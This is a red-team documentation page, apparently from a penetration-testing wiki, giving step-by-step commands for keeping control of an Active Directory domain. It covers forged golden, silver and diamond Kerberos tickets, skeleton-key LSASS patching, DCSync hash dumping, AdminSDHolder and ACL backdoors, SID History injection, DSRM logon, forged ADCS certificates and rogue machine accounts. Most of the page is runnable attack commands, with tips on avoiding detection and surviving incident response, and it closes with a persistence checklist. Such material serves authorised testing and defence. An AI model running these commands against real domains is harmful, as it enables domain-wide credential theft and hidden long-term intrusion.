---
sidebar_position: 1
title: AD Persistence
---

# Active Directory Persistence

AD persistence techniques ensure continued access to the domain even after passwords are changed, accounts are disabled, or machines are rebuilt. These require elevated domain access (usually Domain Admin or equivalent) to set up.

```bash
# Set environment variables
export TARGET=<ip>
export DOMAIN=<domain>
export USER=<username>
export PASSWORD=<password>
export HASH=<ntlm-hash>
```

---

## Golden Tickets

Forge a Kerberos TGT using the `krbtgt` account's NTLM hash. Since all TGTs are encrypted with the `krbtgt` hash, possessing it means you can create TGTs for any user — real or fake — with any group membership.

Requirements: `krbtgt` NTLM hash (obtained via DC Sync), domain SID, domain name.

### Get the krbtgt Hash (DC Sync)

From Windows (Mimikatz):

```powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:$DOMAIN\krbtgt
```

From Kali:

```bash
impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$TARGET -just-dc-user krbtgt
```

### Forge a Golden Ticket

Mimikatz:

```powershell
kerberos::golden /user:Administrator /domain:$DOMAIN /sid:<domain-SID> /krbtgt:<krbtgt-hash> /ptt
misc::cmd
```

impacket-ticketer (from Kali):

```bash
impacket-ticketer -nthash <krbtgt-hash> -domain-sid <domain-SID> -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec $DOMAIN/Administrator@$TARGET -k -no-pass
```

:::tip
Golden tickets are valid for 10 years by default and survive password resets for all accounts except `krbtgt`. The only remediation is resetting the `krbtgt` password twice — once to invalidate current tickets, and again because AD stores the current and previous password.
:::

---

## Silver Tickets

Forge a Kerberos service ticket (TGS) using the password hash of the service account or machine account running the target SPN. Silver tickets are validated by the service itself (not the DC), making them stealthier than golden tickets.

Requirements: service account or machine account NTLM hash, domain SID, target SPN.

### Mimikatz

```powershell
kerberos::golden /sid:<domain-SID> /domain:$DOMAIN /target:<target-hostname> /service:CIFS /rc4:$HASH /user:Administrator /ptt
```

Common service names: CIFS (file shares), HTTP (web), MSSQLSvc (SQL), HOST (general), LDAP, WSMAN (WinRM), RPCSS.

### impacket-ticketer

```bash
impacket-ticketer -nthash $HASH -domain-sid <domain-SID> -domain $DOMAIN -spn CIFS/<target-hostname> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbclient $DOMAIN/Administrator@<target-hostname> -k -no-pass
```

:::warning
Microsoft's PAC validation patch (enforced from October 2022) requires the PAC_REQUESTOR field to be validated by a DC. Silver tickets for nonexistent domain users may fail when the client and KDC are in the same domain. Tickets for real users still work.
:::

---

## Diamond Tickets

Diamond tickets modify a legitimate TGT rather than forging one from scratch. The process requests a real TGT, decrypts it using the `krbtgt` hash, modifies the PAC (adding privileged groups), and re-encrypts it. This is stealthier than golden tickets because the ticket has a legitimate origin.

### Rubeus

```powershell
.\Rubeus.exe diamond /krbkey:<krbtgt-AES256-key> /user:$USER /password:$PASSWORD /enctype:aes /domain:$DOMAIN /dc:<dc-hostname> /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt
```

The `/groups:512` adds Domain Admins membership. The `/ticketuserid:500` specifies the Administrator RID.

:::tip
Diamond tickets are harder to detect than golden tickets because they originate from a real authentication event and have valid AS-REQ/AS-REP entries in DC logs.
:::

---

## Skeleton Key

The skeleton key attack patches LSASS on a domain controller to accept a master password for any domain account alongside the real password. The original passwords continue to work normally.

### Mimikatz (on DC)

```powershell
.\mimikatz.exe
privilege::debug
misc::skeleton
```

The default skeleton key password is `mimikatz`. After injection, you can authenticate as any user:

```bash
impacket-psexec $DOMAIN/Administrator:mimikatz@$TARGET
nxc smb $TARGET -u Administrator -p mimikatz
```

:::warning
The skeleton key only persists until the DC reboots — it lives in LSASS memory. After a reboot, you'd need to re-inject it. It also only affects the DC you run it on — in a multi-DC environment, you'd need to patch each one.
:::

---

## DC Sync

DC Sync impersonates a domain controller and requests credential replication using the MS-DRSR protocol. This extracts password hashes for any domain account without touching NTDS.dit.

Requirements: Domain Admins, Enterprise Admins, or accounts with Replicating Directory Changes + Replicating Directory Changes All rights.

### Mimikatz

Dump a specific user:

```powershell
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:$DOMAIN\Administrator
lsadump::dcsync /user:$DOMAIN\krbtgt
```

Dump all accounts:

```powershell
lsadump::dcsync /domain:$DOMAIN /all /csv
```

### impacket-secretsdump

```bash
impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$TARGET
impacket-secretsdump $DOMAIN/$USER@$TARGET -hashes 00000000000000000000000000000000:$HASH
```

For persistence, grant DC Sync rights to a normal user account you control (see ACL Persistence below).

---

## AdminSDHolder Abuse

AdminSDHolder is a container in AD that defines the security descriptor for all protected groups (Domain Admins, Enterprise Admins, etc.). Every 60 minutes, the SDProp process overwrites the ACL on protected groups with the AdminSDHolder ACL.

By adding a permission for your controlled user to AdminSDHolder, that permission is automatically propagated to all protected groups — and it survives manual ACL cleanups on those groups.

### PowerView

Grant GenericAll on AdminSDHolder to your user:

```powershell
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=$DOMAIN,DC=com" -PrincipalIdentity $USER -Rights All
```

After the next SDProp cycle (up to 60 minutes), your user will have GenericAll on Domain Admins and other protected groups.

Force SDProp to run immediately (from DC):

```powershell
Invoke-SDPropagator -ShowProgress
```

### Verify

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match "<your-user-SID>"}
```

---

## ACL-Based Persistence

Modify ACLs on critical AD objects to grant your controlled account persistent access.

### Grant DC Sync Rights

Add Replicating Directory Changes and Replicating Directory Changes All to a normal user account:

```powershell
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "DC=$DOMAIN,DC=com" -PrincipalIdentity $USER -Rights DCSync
```

Now this user can DC Sync at any time:

```bash
impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$TARGET
```

### Grant WriteDACL / GenericAll

Give your user full control over a high-value target (e.g., Domain Admins group):

```powershell
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity $USER -Rights All
```

Now your user can add themselves to Domain Admins:

```powershell
Add-DomainGroupMember -Identity "Domain Admins" -Members $USER
```

### Grant GenericWrite on Users

Allows you to set SPNs on accounts (for targeted Kerberoasting) or change their passwords:

```powershell
Add-DomainObjectAcl -TargetIdentity "TargetAdmin" -PrincipalIdentity $USER -Rights All
Set-DomainUserPassword -Identity "TargetAdmin" -AccountPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)
```

:::tip
ACL-based persistence is difficult to detect because ACLs are rarely audited by default. Even if an incident response team removes your account from Domain Admins, the ACL permissions persist until explicitly revoked.
:::

---

## SID History Injection

The SID History attribute allows a migrated user to maintain access to resources from a previous domain. By injecting a privileged SID (e.g., Domain Admins) into a user's SID History, that user gains those privileges without being a member of the group.

### Mimikatz (on DC)

```powershell
.\mimikatz.exe
privilege::debug
sid::patch
sid::add /sam:$USER /new:<domain-SID>-512
```

The `-512` is the RID for Domain Admins. After injection, the user has Domain Admin privileges even though they don't appear in the Domain Admins group membership.

### impacket-lookupsid

Find the domain SID first:

```bash
impacket-lookupsid $DOMAIN/$USER:$PASSWORD@$TARGET
```

:::warning
SID History injection requires running Mimikatz on the domain controller itself. It also requires patching LSASS (`sid::patch`) to bypass SID filtering protections.
:::

---

## DSRM (Directory Services Restore Mode)

The DSRM account is a local administrator account on every domain controller, set during AD DS installation. Its password is separate from domain credentials and persists across password changes.

### Extract DSRM Password Hash

```powershell
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

The DSRM password hash is the local Administrator hash in the SAM output.

### Enable DSRM Network Logon

By default, DSRM can only be used in Directory Services Restore Mode (a special boot mode). Enable network logon:

```powershell
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

Value `2` allows DSRM logon at any time (not just in restore mode).

### Use DSRM to Log In

```bash
impacket-psexec -hashes 00000000000000000000000000000000:$HASH Administrator@$TARGET
```

:::tip
Add `--local-auth` or authenticate with `.\Administrator` to use the local DSRM account instead of the domain Administrator.
:::

---

## Certificate-Based Persistence (ADCS)

If Active Directory Certificate Services (ADCS) is deployed, stolen or forged certificates provide persistent authentication that survives password changes.

### Steal Existing Certificates

Extract certificates from the current user's certificate store:

```powershell
.\Certify.exe find /clientauth
```

Export a certificate with its private key:

```powershell
.\Certify.exe request /ca:<ca-hostname>\<ca-name> /template:User
```

### Forge Certificates (Golden Certificate)

If you have the CA's private key, you can forge certificates for any user:

Extract the CA key (requires admin on the CA server):

```bash
# Using Certipy from Kali
certipy ca -backup -ca '<ca-name>' -u $USER@$DOMAIN -p $PASSWORD
```

Forge a certificate for a target user:

```bash
certipy forge -ca-pfx ca.pfx -upn administrator@$DOMAIN -subject 'CN=Administrator,CN=Users,DC=$DOMAIN,DC=com'
```

Authenticate with the forged certificate:

```bash
certipy auth -pfx administrator.pfx -dc-ip $TARGET
```

:::tip
Forged certificates remain valid for as long as the CA certificate is valid (typically 5+ years). The only remediation is revoking the CA and rebuilding the PKI — which most organizations are extremely reluctant to do.
:::

---

## Machine Account Persistence

Add a computer account to the domain that you control. Machine accounts can authenticate to the domain and are harder to notice than user accounts.

### Create a Machine Account

```bash
impacket-addcomputer $DOMAIN/$USER:$PASSWORD -computer-name 'YOURPC$' -computer-pass 'Password123!'
```

Or with PowerView:

```powershell
New-MachineAccount -MachineAccount YOURPC -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

By default, any authenticated domain user can add up to 10 computer accounts (controlled by the `ms-DS-MachineAccountQuota` attribute).

Use the machine account for authentication:

```bash
impacket-psexec $DOMAIN/'YOURPC$':'Password123!'@$TARGET
nxc smb $TARGET -u 'YOURPC$' -p 'Password123!'
```

---

## Shadow Copies (NTDS.dit)

Volume shadow copies on domain controllers contain the NTDS.dit database with all domain password hashes. Creating a shadow copy preserves a snapshot that persists even if passwords are changed later.

Full extraction procedure is covered on the [Lateral Movement](/red-team/active-directory/lateral-movement/lateral-movement#shadow-copies) page.

---

## Persistence Checklist

After gaining Domain Admin access, consider establishing multiple persistence mechanisms:

1. DC Sync and save all hashes (immediate backup)
2. Forge a golden ticket (survives password changes)
3. Add ACL-based DC Sync rights to a controlled user (survives group membership removal)
4. Inject SID History on a controlled user (hidden privilege escalation)
5. Modify AdminSDHolder (auto-restores ACLs every 60 minutes)
6. Create a machine account (harder to notice than user accounts)
7. If ADCS is present, forge a certificate (survives password resets, valid for years)

:::warning
In a real engagement, document everything you set up for persistence and ensure all mechanisms are removed during the cleanup phase. Leaving persistence in a production environment after an engagement is a serious risk.
:::
